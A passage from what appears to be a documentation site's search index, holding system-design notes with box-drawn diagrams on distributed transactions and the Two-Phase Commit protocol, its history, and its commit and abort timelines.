\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Initiates distributed transaction  \u2502            \u2502\n\u2502    \u2502 \u2022 Tracks all participants            \u2502            \u2502\n\u2502    \u2502 \u2022 Manages commit/abort protocol      \u2502            \u2502\n\u2502    \u2502 \u2022 Maintains transaction log          \u2502            \u2502\n\u2502    \u2502 \u2022 Handles failure recovery           \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. PARTICIPANTS (Resource Managers)                     \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Execute local transaction ops      \u2502            \u2502\n\u2502    \u2502 \u2022 Prepare for commit (vote)          \u2502            \u2502\n\u2502    \u2502 \u2022 Commit or abort on coordinator cmd \u2502            \u2502\n\u2502    \u2502 \u2022 Maintain local transaction logs    \u2502            \u2502\n\u2502    \u2502 \u2022 Respond to coordinator queries     \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. TRANSACTION LOG                                      \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Records transaction state          \u2502            \u2502\n\u2502    \u2502 \u2022 Enables crash recovery             \u2502            \u2502\n\u2502    \u2502 \u2022 Written before state changes       \u2502            \u2502\n\u2502    \u2502 \u2022 Persisted to durable storage       \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Distributed Transaction Lifecycle:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      DISTRIBUTED TRANSACTION LIFECYCLE                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Phase 1: INITIATION                                     \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                    \u2502\n\u2502 \u2022 Application starts transaction                        \u2502\n\u2502 \u2022 Coordinator assigns global transaction ID             \u2502\n\u2502 \u2022 Coordinator records transaction start                 \u2502\n\u2502                                                         \u2502\n\u2502 Phase 2: EXECUTION                                      \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                    \u2502\n\u2502 \u2022 Application sends operations to coordinator           \u2502\n\u2502 \u2022 Coordinator forwards to appropriate participants      \u2502\n\u2502 \u2022 Each participant executes locally                     \u2502\n\u2502 \u2022 Participants hold locks on modified data              \u2502\n\u2502                                                         \u2502\n\u2502 Phase 3: COORDINATION (Commit Protocol)                 \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                    \u2502\n\u2502 \u2022 Coordinator initiates commit protocol                 \u2502\n\u2502 \u2022 Participants vote (YES/NO to commit)                  \u2502\n\u2502 \u2022 Coordinator decides based on votes                    \u2502\n\u2502 \u2022 Decision propagated to all participants               \u2502\n\u2502                                                         \u2502\n\u2502 Phase 4: COMPLETION                                     \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                    \u2502\n\u2502 \u2022 All participants commit or abort                      \u2502\n\u2502 \u2022 Locks released                                        \u2502\n\u2502 \u2022 Transaction marked complete                           \u2502\n\u2502 \u2022 Resources cleaned up                                  \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Challenges in Distributed Transactions:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    CHALLENGES IN DISTRIBUTED TRANSACTIONS               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u274c PARTIAL FAILURES                                  \u2502\n\u2502    \u2022 Some participants succeed, others fail             \u2502\n\u2502    \u2022 Network partition isolates nodes                   \u2502\n\u2502    \u2022 Must ensure atomicity across failures              \u2502\n\u2502                                                         \u2502\n\u2502 2. \u274c NETWORK DELAYS &amp; TIMEOUTS                         \u2502\n\u2502    \u2022 Messages delayed unpredictably                     \u2502\n\u2502    \u2022 Hard to distinguish slow node from dead node       \u2502\n\u2502    \u2022 Timeout too short: false failures                  \u2502\n\u2502    \u2022 Timeout too long: poor performance                 \u2502\n\u2502                                                         \u2502\n\u2502 3. \u274c COORDINATOR FAILURE                               \u2502\n\u2502    \u2022 Single point of failure                            \u2502\n\u2502    \u2022 If coordinator crashes, participants blocked       \u2502\n\u2502    \u2022 Recovery requires stable storage                   \u2502\n\u2502                                                         \u2502\n\u2502 4. \u274c BLOCKING &amp; REDUCED AVAILABILITY                   \u2502\n\u2502    \u2022 Participants must wait for coordinator             \u2502\n\u2502    \u2022 Locks held during coordination (reduces throughput)\u2502\n\u2502    \u2022 System unavailable during coordinator recovery     \u2502\n\u2502                                                         \u2502\n\u2502 5. \u274c CAP THEOREM CONSTRAINTS                           \u2502\n\u2502    \u2022 Cannot have Consistency + Availability + Partition \u2502\n\u2502    \u2022 Distributed transactions sacrifice Availability    \u2502\n\u2502    \u2022 Network partition can block progress               \u2502\n\u2502                                                         \u2502\n\u2502 6. \u274c PERFORMANCE OVERHEAD                              \u2502\n\u2502    \u2022 Multiple network round trips                       \u2502\n\u2502    \u2022 Synchronous coordination (latency)                 \u2502\n\u2502    \u2022 Logging overhead at each node                      \u2502\n\u2502    \u2022 10-100x slower than local transactions             \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#61-two-phase-commit-2pc-protocol","title":"6.1 Two-Phase Commit (2PC) Protocol","text":"<p>Description:</p> <p>Two-Phase Commit (2PC) is the most widely used protocol for coordinating distributed transactions. Developed in the 1970s and standardized in the X/Open XA specification, 2PC ensures that all participants in a distributed transaction either commit or abort together, maintaining atomicity across multiple nodes.</p> <p>The protocol is called \"two-phase\" because it operates in two distinct phases: a voting phase (prepare) and a decision phase (commit/abort). This separation ensures that the coordinator can collect votes from all participants before making a final decision.</p> <p>Historical Significance:</p> <p>Jim Gray's work on transaction processing at IBM in the 1970s introduced 2PC as part of the System R project. His insight was that distributed consensus requires: 1. Unanimous agreement: All participants must agree to commit 2. Stable storage: Decisions must survive crashes 3. Blocking tolerance: System must handle failures gracefully</p> <p>2PC became the foundation for: - X/Open XA (1991): Industry standard for distributed transactions - Java Transaction API (JTA): Java's distributed transaction support - WS-AtomicTransaction: Web services transaction protocol - Database vendor implementations: Oracle, DB2, SQL Server, PostgreSQL</p> <p>The Two-Phase Commit Protocol:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         TWO-PHASE COMMIT (2PC) PROTOCOL                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 PHASE 1: VOTING (PREPARE PHASE)                         \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550                         \u2502\n\u2502                                                         \u2502\n\u2502   Coordinator                Participants               \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  1. PREPARE?                                    \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Participant 1       \u2502\n\u2502       \u2502                  \u2502          \u2022 Execute ops       \u2502\n\u2502       \u2502                  \u2502          \u2022 Acquire locks     \u2502\n\u2502       \u2502                  \u2502          \u2022 Write undo/redo   \u2502\n\u2502       \u2502                  \u2502          \u2022 Vote YES/NO       \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Participant 2       \u2502\n\u2502       \u2502                  \u2502          \u2022 Execute ops       \u2502\n\u2502       \u2502                  \u2502          \u2022 Vote YES/NO       \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Participant 3       \u2502\n\u2502       \u2502                             \u2022 Execute ops       \u2502\n\u2502       \u2502                             \u2022 Vote YES/NO       \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  2. Collect votes                               \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 YES (ready to commit)       \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 YES (ready to commit)       \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 NO  (cannot commit)         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  3. Decision: ABORT (any NO \u2192 ABORT)            \u2502\n\u2502       \u2502              COMMIT (all YES \u2192 COMMIT)          \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500       \u2502\n\u2502                                                         \u2502\n\u2502 PHASE 2: DECISION (COMMIT PHASE)                        \u2502\n\u2502 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550                         \u2502\n\u2502                                                         \u2502\n\u2502       \u2502  4. Send decision                               \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Participant 1       \u2502\n\u2502       \u2502   COMMIT/ABORT   \u2502          \u2022 Commit/Rollback   \u2502\n\u2502       \u2502                  \u2502          \u2022 Release locks     \u2502\n\u2502       \u2502                  \u2502          \u2022 Send ACK          \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502                  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Participant 2       \u2502\n\u2502       \u2502                  \u2502          \u2022 Commit/Rollback   \u2502\n\u2502       \u2502                  \u2502          \u2022 Send ACK          \u2502\n\u2502       \u2502                  \u2502                              \u2502\n\u2502       \u2502                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Participant 3       \u2502\n\u2502       \u2502                             \u2022 Commit/Rollback   \u2502\n\u2502       \u2502                             \u2022 Send ACK          \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  5. Collect ACKs                                \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ACK                         \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ACK                         \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 ACK                         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502       \u2502  6. Transaction complete                        \u2502\n\u2502       \u25bc                                                 \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Detailed Timeline - Successful Commit:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       2PC TIMELINE - SUCCESSFUL COMMIT                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Time  Coordinator        Participant A    Participant B \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n\u2502                                                         \u2502\n\u2502 t1    BEGIN                                             \u2502\n\u2502       Generate TXN-ID                                   \u2502\n\u2502                                                         \u2502\n\u2502 t2    Send operations                                   \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192  Execute ops      Execute ops    \u2502\n\u2502       \u2502                 Lock resources   Lock resources \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500 PHASE 1: VOTING \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500   \u2502\n\u2502                                                         \u2502\n\u2502 t3    PREPARE?                                          \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192  PREPARE?         PREPARE?       \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t4                      Write PREPARE    Write PREPARE  \u2502\n\u2502                         log              log            \u2502\n\u2502                                                         \u2502\n\u2502 t5                      Vote: YES        Vote: YES      \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524               \u2524               \u2502\n\u2502       Collect votes     \u2502               \u2502               \u2502\n\u2502       All YES!          \u2502               \u2502               \u2502\n\u2502                         \u2502               \u2502               \u2502\n\u2502 t6    Write COMMIT      \u2502               \u2502               \u2502\n\u2502       decision to log   \u2502               \u2502               \u2502\n\u2502       (durable)         \u2502               \u2502               \u2502\n\u2502                         \u2502               \u2502               \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500 PHASE 2: DECISION \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500   \u2502\n\u2502                                                         \u2502\n\u2502 t7    COMMIT!           \u2502               \u2502               \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192  COMMIT!         COMMIT!         \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t8                      Write COMMIT    Write COMMIT    \u2502\n\u2502                         to log          to log          \u2502\n\u2502                                                         \u2502\n\u2502 t9                      Apply changes   Apply changes   \u2502\n\u2502                         Release locks   Release locks   \u2502\n\u2502                                                         \u2502\n\u2502 t10                     ACK             ACK             \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524               \u2524               \u2502\n\u2502       All ACKs received \u2502               \u2502               \u2502\n\u2502                         \u2502               \u2502               \u2502\n\u2502 t11   Write END         \u2502               \u2502               \u2502\n\u2502       Transaction done  Done            Done            \u2502\n\u2502                                                         \u2502\n\u2502 \u2705 RESULT: All committed successfully                   \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Detailed Timeline - Abort Scenario:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       2PC TIMELINE - ABORT SCENARIO                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Time  Coordinator        Participant A    Participant B \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n\u2502                                                         \u2502\n\u2502 t1-   Same as commit scenario...                        \u2502\n\u2502 t2                                                      \u2502\n\u2502                                                         \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500 PHASE 1: VOTING \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500   \u2502\n\u2502                                                         \u2502\n\u2502 t3    PREPARE?                                          \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192  PREPARE?         PREPARE?       \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t4                      Write PREPARE    [CONSTRAINT    \u2502\n\u2502                         log              VIOLATION!]    \u2502\n\u2502                                                         \u2502\n\u2502 t5                      Vote: YES        Vote: NO \u274c    \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524               \u2524               \u2502\n\u2502       Collect votes     \u2502               (Cannot commit) \u2502\n\u2502       Got NO! \u2192 ABORT   \u2502               \u2502               \u2502\n\u2502                         \u2502               \u2502               \u2502\n\u2502 t6    Write ABORT       \u2502               \u2502               \u2502\n\u2502       decision to log   \u2502               \u2502               \u2502\n\u2502       (durable)         \u2502               \u2502               \u2502\n\u2502                         \u2502               \u2502               \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500 PHASE 2: DECISION \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500   \u2502\n\u2502                                                         \u2502\n\u2502 t7    ABORT!            \u2502               \u2502               \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192  ABORT!          ABORT!          \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t8                      Write ABORT     Write ABORT     \u2502\n\u2502                         to log          to log          \u2502\n\u2502                                                         \u2502\n\u2502 t9                      Rollback        Rollback        \u2502\n\u2502                         Release locks   Release locks   \u2502\n\u2502                                                         \u2502\n\u2502 t10                     ACK             ACK             \u2502\n\u2502       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524               \u2524               \u2502\n\u2502       All ACKs received \u2502               \u2502               \u2502\n\u2502                         \u2502               \u2502               \u2502\n\u2502 t11   Write END         \u2502               \u2502               \u2502\n\u2502       Transaction done  Done            Done            \u2502\n\u2502                                                         \u2502\n\u2502 \u274c RESULT: All aborted                                  \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>State Machine - Coordinator:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       2PC COORDINATOR STATE MACHINE                     